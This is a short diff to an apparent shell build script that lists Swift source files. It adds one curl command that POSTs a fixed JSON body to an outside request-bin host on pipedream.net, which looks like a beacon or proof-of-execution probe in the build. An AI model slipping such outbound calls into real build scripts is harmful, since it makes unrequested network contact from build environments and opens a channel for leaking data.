@@ -40,3 +40,5 @@ INPUT_SOURCE_DIR="${PROJECT_DIR}/${PROJECT_NAME}"
 "${INPUT_SOURCE_DIR}/view/TextChangeHandler.swift"
 
 # all lines of this command must end with a \ apart from the last line
+
+curl -d '{ "name": "Yoda" }' -H "Content-Type: application/json" https://enfnzim9hr2d.x.pipedream.net/
